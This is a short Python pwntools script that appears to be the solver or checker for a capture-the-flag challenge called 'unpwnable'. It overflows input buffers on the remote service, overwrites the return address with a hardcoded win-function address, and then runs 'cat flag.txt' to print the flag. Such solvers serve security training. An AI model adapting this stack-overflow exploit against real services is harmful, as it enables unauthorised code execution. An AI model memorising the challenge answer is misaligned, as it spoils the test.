#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import remote, p64, p32, context

def checker():
    r = remote(DOMAIN, PORT)

    r.recvuntil(b':')
    r.sendline(b'a' * 76 + p32(96))

    r.recvuntil(b'stuff')
    r.sendline(b'69')

    r.recvuntil(b'it.')
    WIN_ADDR = 0x401196 # TODO: maybe get this dynamically
    r.sendline(b'a'*88 + p64(WIN_ADDR))
    r.recvuntil(b'Bye!\n')

    r.sendline(b'cat flag.txt')
    print(r.recvuntil(b'}').decode())

if __name__ == '__main__':
    DOMAIN = "unpwnable.challs.pascalctf.it"
    PORT = 1338

    context.log_level = 'error'

    checker()
